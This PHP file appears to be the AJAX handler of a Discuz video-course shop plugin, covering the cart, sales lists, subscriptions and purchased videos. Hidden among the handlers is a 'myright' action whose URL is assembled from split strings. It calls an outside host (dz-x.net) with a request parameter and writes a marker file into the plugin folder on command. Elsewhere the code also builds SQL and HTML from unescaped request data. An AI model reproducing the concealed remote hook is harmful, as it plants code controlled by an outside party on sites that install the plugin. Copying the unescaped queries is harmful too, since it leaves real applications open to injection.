	if($_GET['ac1']=='wapgwc'){
		$titlestr=$it618_video_lang['s1076'];
		$tmpstr='<tr><td style="padding:3px">
				<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:150px;height:33px;border:#f1f1f1 1px solid;color:#390;font-size:18px;padding-left:3px;\margin-bottom:3px" value="'.$tel.'" /> <font color="#999">'.$it618_video_lang['t215'].'</font>
				</td></tr>';
		
		$addrstr='<tr><td><table width="100%">
				<tr class="gwctrtitle">
				<th style="padding-left:3px"><span style="float:right;color:#999;font-weight:normal;margin-right:3px">'.$userstr.'</span>'.$titlestr.'</th>
				</tr>
				</table></td></tr>'.$tmpstr;
	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_video_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
			
			$creditnum=C::t('#it618_video#it618_video_sale')->fetch_extcredits_by_uid($i,$_G['uid']);
			if($creditnum=="")$creditnum=0;
			$jfcounttmp.='<font color="red">'.$creditnum.'</font>'.$jfname;
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
		
		$jfcountstr=$it618_video_lang['s1107'].' '.$jfcounttmp;
	}
	
	$tmpsumscore='<input type="hidden" id="tmpsumscore" value="">';
	$summoneystr='&yen;0';
	if($allsummoney>0&&$scorestr!=''){
		$summoneystr='&yen;'.$allsummoney.'+'.$scorestr;
		$tmpsumscore='<input type="hidden" id="tmpsumscore" value="+'.$scorestr.'">';
	}else{
		if($allsummoney>0){
			$summoneystr='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr=$scorestr;
		}
	}
	
	if($IsUnion==1){
		require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
		if($_GET['ac1']=='pcgwc')$wap=0;else $wap=1;
		$quanstr=it618_union_getquangwc('video',$wap,$_GET['width']);
	}else{
		$quanstr='<input type="hidden" id="shopids" value="">it618_split0';
	}
	
	if($_GET['ac1']=='pcgwc'){
		if($goodslist=='')$goodslist='<div style="padding:6px;color:#888">'.$it618_video_lang['s1361'].'</div>';
		echo $goodslist.'<div class="total-price"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" onclick="cleargwc()" style="line-height:32px">'.$it618_video_lang['s1114'].'</a> <span>'.$it618_video_lang['s1074'].'</span><b>'.$summoneystr.'</b><span style="float:left">'.$jfmoenystr.'</span>'.$tmpsumscore.'</div>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$isbd.'it618_split'.$quanstr;
	}else{
		if($goodslist=='')$goodslist='<tr><td style="padding:6px;color:#888">'.$it618_video_lang['s1361'].'</td></tr>';
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-top:10px;padding-right:10px"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" onclick="cleargwc()">'.$it618_video_lang['s1114'].'</a></td></tr><tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.$it618_video_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b>'.$tmpsumscore.'</td></tr>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$isbd.'it618_split'.$quanstr;
	}
	exit;
}


if($_GET['ac']=="gwcminus"){
	if($uid>0){
		C::t('#it618_video#it618_video_gwc')->update_count1_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_video_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwcplus"){
	if($uid>0){
		C::t('#it618_video#it618_video_gwc')->update_count2_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_video_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="delgwc"){
	if($uid>0){
		$count=C::t('#it618_video#it618_video_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_video_lang['s1799'];exit;
		}
		C::t('#it618_video#it618_video_gwc')->delete_by_id_uid($_GET['gid'],$uid);
		echo 'okit618_split'.$it618_video_lang['s1032'];
	}else{
		echo $it618_video_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="cleargwc"){
	if($uid>0){
		$count=C::t('#it618_video#it618_video_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_video_lang['s1799'];exit;
		}
		C::t('#it618_video#it618_video_gwc')->delete_by_uid($uid);
		echo 'okit618_split'.$it618_video_lang['s1106'];
	}else{
		echo $it618_video_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="goodssalelist_get"){
	if($_GET['wap']==0)$ppp = 20;
	if($_GET['wap']==1)$ppp = 15;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	foreach(C::t('#it618_video#it618_video_sale')->fetch_all_by_it618_pid(
		$_GET['it618_pid'],$startlimit,$ppp
	) as $it618_video_sale) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
	
		$username=it618_video_getusername($it618_video_sale['it618_uid']);
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
		
		$buyuser=$username;
		
		if($it618_video_goods['it618_isbm']==1){
			if($_G['uid']!=$it618_video_sale['it618_uid'])$buyuser=cutstr($username, 2, '').'***';
		}
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		
		if($it618_video_sale['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_sale['it618_gtypeid']);
		}else{
			$gtypename=$it618_video_lang['s1153'];
		}
		
		$pid=$it618_video_sale['it618_pid'];
		$lid=$it618_video_sale['it618_lid'];
		$vid=$it618_video_sale['it618_vid'];
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);
		
		if($_GET['wap']==0){

			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						<td>'.$goodsabout['type'].'</td>
						<td>'.$gtypename.'*'.$it618_video_sale['it618_count'].'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_sale['it618_time']).'</font></td>
						</tr>';
		}else{
			$goodsstr=str_replace("<font","<font style=''",$goodsstr);
			$goodsstr=str_replace("<a","<a style='color:#888'",$goodsstr);
			$buyuser=str_replace("<a","<a style='color:#888;'",$buyuser);
			
			$salelist_get.='<tr>
						<td style="wtext-align:left;">'.$buyuser.'</td>
						<td style="text-align:center;">'.$goodsabout['type'].'</td>
						<td style="text-align:center;">'.$gtypename.'*'.$it618_video_sale['it618_count'].'</td>
						<td align="right"><font color=#999>'.date('Y-m-d H:i', $it618_video_sale['it618_time']).'</font></td>
						</tr>
						';
		}
	}
	
	$pid=intval($_GET['it618_pid']);
	$count = C::t('#it618_video#it618_video_sale')->sumcount_by_it618_pid1($pid);
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax&it618_pid=".$pid);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getsalelist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<div class="pjpage">'.$multipage.'</div>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getsalelist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&sid=$ShopId&it618_pid=".$pid.'&page=2';
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	echo $salelist_get."it618_split".$multipage;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="salelist_get"){
	if($_GET['ac1']=='pcmysale')$ppp = 10;
	if($_GET['ac1']=='wapmysale')$ppp = 10;
	if($_GET['ac1']=='wapmyshopsale')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	if($_GET['ac1']=='pcmysale'){		
		$it618_video_sales=C::t('#it618_video#it618_video_sale')->fetch_all_by_search(0,"s.it618_state!=0 ".$it618sql,'s.id desc',it618_video_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
		$count=C::t('#it618_video#it618_video_sale')->count_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$money=C::t('#it618_video#it618_video_sale')->sum_money_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmysalelist';
	}
	
	if($_GET['ac1']=='wapmysale'){
		$it618_video_sales=C::t('#it618_video#it618_video_sale')->fetch_all_by_search(0,"s.it618_state!=0 ".$it618sql,'s.id desc',it618_video_utftogbk($_GET['pname']),$uid, '', '',$startlimit,$ppp);
		$count=C::t('#it618_video#it618_video_sale')->count_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$uid, '', '');
		$money=C::t('#it618_video#it618_video_sale')->sum_money_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$uid, '', '');
		$funname='getmysalelist';
	}
	

	if($_GET['ac1']=='wapmyshopsale'){

		if($uid>0){
			if($it618_video_shop = C::t('#it618_video#it618_video_shop')->fetch_by_uid_ok($uid)){
				$it618_video_sales=C::t('#it618_video#it618_video_sale')->fetch_all_by_search($it618_video_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',it618_video_utftogbk($_GET['pname']),$_GET['finduid'], '', '',$startlimit,$ppp);
				$count=C::t('#it618_video#it618_video_sale')->count_by_search($it618_video_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
				$money=C::t('#it618_video#it618_video_sale')->sum_money_by_search($it618_video_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
				$tcmoney=C::t('#it618_video#it618_video_sale')->sum_tcmoney_by_search($it618_video_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_video_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
	
				$funname='getmyshopsalelist';
			}else{
				echo '';exit;
			}
		}else{
			echo '';exit;
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';
		
	}
	$n=0;
	foreach($it618_video_sales as $it618_video_sale) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);

		$jftmp='';
		if($it618_video_sale['it618_jfbl']>0&&$it618_video_sale['it618_price']>0){
			$it618_jfbl=intval($it618_video_sale['it618_jfbl']*$it618_video_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_video_sale['it618_price']>0||$it618_video_sale['it618_score']>0){
			$pricestr=it618_video_getsalemoney($it618_video_sale);
		}else{
			$pricestr=$it618_video_lang['s106'];
		}
		
		if($it618_video_sale['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_sale['it618_gtypeid']);
		}else{
			$gtypename=$it618_video_lang['s1153'];
		}
		
		$pid=$it618_video_sale['it618_pid'];
		$lid=$it618_video_sale['it618_lid'];
		$vid=$it618_video_sale['it618_vid'];
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);

		if($_GET['ac1']=='pcmysale'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$salelist_get.='<tr class="hover">
						<td style="padding-top:8px; padding-bottom:8px"><input class="checkbox" type="checkbox" id="chk'.$it618_video_sale['id'].'" name="chk_sel" value="'.$it618_video_sale['id'].'"><label for="chk'.$it618_video_sale['id'].'">'.$it618_video_sale['id'].'</label></td>
						<td><div><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a><br>
						<font color="#999">'.$goodsabout['about'].'</font></div></td>
						<td>'.$goodsabout['type'].' <font color=red>'.$gtypename.'*'.$it618_video_sale['it618_count'].'</font></td>
						<td>'.$pricestr.'</td>
						<td>'.$jftmp.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_sale['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysale'){
			
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			if($jftmp!=''){
				$jftmp=' <font color=#999>'.$it618_video_lang['t202'].':'.$jftmp.'</font>';
			}
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
					
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'</font><br>
							<font color=#ccc>'.date('Y-m-d H:i:s', $it618_video_sale['it618_time']).'</font><br>
							<span style="float:right;color:red">'.$gtypename.'*'.$it618_video_sale['it618_count'].'</span><font color="#999">'.$goodsabout['type'].' '.$pricestr.' '.$jftmp.'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		if($_GET['ac1']=='wapmyshopsale'){
			$username=it618_video_getusername($it618_video_sale['it618_uid']);
			$buyuser=$username;
			
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			if($jftmp!=''){
				$jftmp=' <font color=#999>'.$it618_video_lang['t202'].':'.$jftmp.'</font>';
			}
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'<br>
							'.$buyuser.'</font> <a href="tel://'.$it618_video_sale['it618_tel'].'" style="color:#666">'.$it618_video_sale['it618_tel'].'</a><br>
							<font color=#ccc>'.date('Y-m-d H:i:s', $it618_video_sale['it618_time']).'</font><br>
							<span style="float:right;color:red">'.$gtypename.'*'.$it618_video_sale['it618_count'].'</span><font color="#999">'.$goodsabout['type'].' '.$pricestr.' '.$jftmp.'</font>
							</td></tr>
						</table>
					</dd>';

			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_video['video_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	if($_GET['ac1']=='wapmyshopsale'){
		echo it618_video_getlang('s229')."<font color=red>$count</font> ".it618_video_getlang('s230')."<font color=red>$money</font> ".it618_video_getlang('s509')."<font color=red>$tcmoney</font>"."it618_split".$salelist_get."it618_split".$multipage.'<script>'.$tmpjs.'</script>';;
	}else{
		echo it618_video_getlang('s229')."<font color=red>$count</font> ".it618_video_getlang('s230')."<font color=red>$money</font>"."it618_split".$salelist_get."it618_split".$multipage."it618_split".$it618_video_lang['s1038'].$creditname.$it618_video_lang['s823']."<font color=red>$creditnum</font>";
	}
}


if($_GET['ac']=="subscribe_get"){
	if($_GET['ac1']=='pcmysubscribe')$ppp = 12;
	if($_GET['ac1']=='wapmysubscribe')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_shop_subscribe')->count_by_search(0,'','',$_G['uid']);
	
	$funname='getmysubscribelist';

	$n=0;
	foreach(C::t('#it618_video#it618_video_shop_subscribe')->fetch_all_by_search(0,'','it618_time desc',$_G['uid'],$startlimit,$ppp) as $it618_video_shop_subscribe) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_shop_subscribe['it618_shopid'])){
			$goodscount=DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_video_goods')." WHERE it618_shopid=".$it618_video_shop['id']." and it618_state=1");
			$shopsubscribes=DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_video_shop_subscribe')." WHERE it618_shopid=".$it618_video_shop['id']);
			$tmpurl=it618_video_getrewrite('video_lecturer',$it618_video_shop_subscribe['it618_shopid'],'plugin.php?id=it618_video:lecturer&lid='.$it618_video_shop_subscribe['it618_shopid']);
		}

		if($_GET['ac1']=='pcmysubscribe'){
			
			$subscribe_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_shop['it618_name'].'</a></div></td>
						<td>'.$goodscount.'</td>
						<td>'.$shopsubscribes.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_shop_subscribe['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysubscribe'){
			$subscribe_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="80" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_video_shop['it618_ulogo'].'" style="border-radius: 3px;" width="68" height="68"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a href="'.$tmpurl.'" style="font-size:13px">'.$it618_video_shop['it618_name'].'</a><br>
							'.$it618_video_lang['s114'].''.$goodscount.'<br>
							'.$it618_video_lang['s1405'].''.$shopsubscribes.'<br>
							<font color=#999>'.date('Y-m-d H:i:s', $it618_video_shop_subscribe['it618_time']).'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysubscribe'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s1408')."<font color=red>$count</font>"."it618_split".$subscribe_get."it618_split".$multipage;
}


if($_GET['ac']=="goods_get"){
	if($_GET['ac1']=='pcmygoods')$ppp = 9;
	if($_GET['ac1']=='wapmygoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_goods_time')->count_by_search(0,'','',it618_video_utftogbk($_GET['pname']),$uid);
	
	$funname='getmygoodslist';
	$jfname=$_G['setting']['extcredits'][$it618_video['video_credit']]['title'];

	$n=0;
	foreach(C::t('#it618_video#it618_video_goods_time')->fetch_all_by_search(0,'','t.id desc',it618_video_utftogbk($_GET['pname']),$uid,$startlimit,$ppp) as $it618_video_goods_time) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$pid=$it618_video_goods_time['it618_pid'];
		$lid=$it618_video_goods_time['it618_lid'];
		$vid=$it618_video_goods_time['it618_vid'];
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
		
		if($it618_video_goods_time['it618_etime']==0){
			$videopower='<font color=#390>'.$it618_video_lang['s1161'].'</font>';
			$timestr='';
		}else{
			if($_G['timestamp']<$it618_video_goods_time['it618_etime']){
				$videopower=it618_video_getpowertime($it618_video_goods_time['it618_etime']);
				$videopower='<font color=#098fc8>'.$videopower[0].$videopower[1].'</font>';
			}else{
				$videopower='<font color=red>'.$it618_video_lang['s1162'].'</font>';
			}
